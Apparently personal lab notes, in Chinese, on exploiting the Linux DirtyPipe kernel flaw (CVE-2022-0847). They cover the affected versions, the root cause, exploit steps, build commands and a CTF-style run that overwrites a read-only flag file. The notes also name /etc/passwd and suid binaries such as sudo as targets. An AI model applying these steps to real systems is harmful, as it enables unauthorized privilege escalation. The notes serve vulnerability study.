## 编译选项

- 本人选择 `linux-5.10.1` 内核版本
```txt
CONFIG_SLAB=y
CONFIG_E1000=y 
CONFIG_E1000E=y
```

## 原理

影响范围： 5.8 版本以上的内核均会收到该漏洞的影响，在 5.16.11、5.15.25、5.10.102 版本中才被修复

详情见[pdf](./CVE-2022-0847%20%20%20%20DirtyPipe.pdf)

1. pipe flags使用后没有清除
2. splice 0拷贝使用pipe 传输。


## steps

1. 创建管道，读写一次，使其flag为`PIPE_BUF_FLAG_CAN_MERGE`
2. splice 0拷贝，写入一个字节
3. 写入管道，由于flag的问题，写入之前的文件，造成**任意可读文件**的写

### how

- 往可读文件中写入，比如 `/etc/passwd`
- suid 文件写入shellcode, 比如 `sudo` 命令

## exploit

1. 创建一个`/flag.txt` 并且设置为可读，看能否改写
2. 那写入 suid程序只需要把写的内容改成shellcode 就行。但是别忘了恢复内容。

- 编译
```bash
make
    [+] start dirtypipe_writeany
    clang -static  dirtypipe_writeany.c -o dirtypipe_writeany
    [+] end
    [+] start dirtypipe_suid
    clang -static  dirtypipe_suid.c -o dirtypipe_suid
    [+] enmake 
```

- 打包环境内
```bash
[ctf@busybox]-[/home/ctf] 🤣 👉 ls
dirtypipe_writeany
[ctf@busybox]-[/home/ctf] 🤣 👉 cat /flag.txt
flag{what_A_mAg1c_cve}
[ctf@busybox]-[/home/ctf] 🤣 👉 ./dirtypipe_writeany /flag.txt 5 polluted
[+] get page size
[+] get and check args
[+] prepare pipe
[+] splice file
[+] write content to target file
[+] finish exploit!!
[ctf@busybox]-[/home/ctf] 🤣 👉 cat /flag.txt
flag{pollutedAg1c_cve}
```

**在使用时可能clang报错，修改**
```makefile
# change `CC := clang` to this
CC := gcc
```
**没有测试过修改suid 程序，没有环境**

### busybox suid

! todo()

## dirty pipe 在uaf 使用

可以改变 pipe 的flag，从而避免了 smep, smap, kpti 等保护的绕过。但是需要比较大的 heap size